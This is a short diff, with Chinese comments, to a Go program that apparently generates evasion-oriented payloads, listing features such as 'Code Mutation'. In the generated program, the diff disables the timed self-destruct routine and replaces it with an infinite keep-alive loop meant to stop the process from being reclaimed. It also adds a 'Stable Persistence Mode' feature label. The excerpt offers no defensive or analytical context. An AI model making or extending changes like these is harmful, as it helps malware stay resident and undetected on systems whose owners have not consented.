@@ -523,14 +523,19 @@ func main() {
 	// 最终等待
 	time.Sleep(time.Duration(2000+rand.Intn(1000)) * time.Millisecond)
 	
-	// 自清理（后台执行）
-	go func() {
-		time.Sleep(5 * time.Second)
-		selfDestruct()
-	}()
+	// 移除自清理机制，程序将持续稳定运行
+	// 注释掉原有的自删除和退出逻辑
+	// go func() {
+	//     time.Sleep(5 * time.Second)
+	//     selfDestruct()
+	// }()
 	
-	// 保持进程存在一段时间
-	time.Sleep(10 * time.Second)
+	// 程序持续运行，确保稳定性
+	for {
+		// 保持程序活跃，防止被系统回收
+		time.Sleep(30 * time.Second)
+		// 可以在这里添加心跳或其他保活逻辑
+	}
 }
 `
 
@@ -675,6 +680,9 @@ func main() {
 	if *enableMutate {
 		features = append(features, "Code Mutation")
 	}
+	
+	// 添加稳定性提示
+	features = append(features, "Stable Persistence Mode")
 	
 	if len(features) > 0 {
 		log.Printf("[+] Enabled evasion features: %v", features)
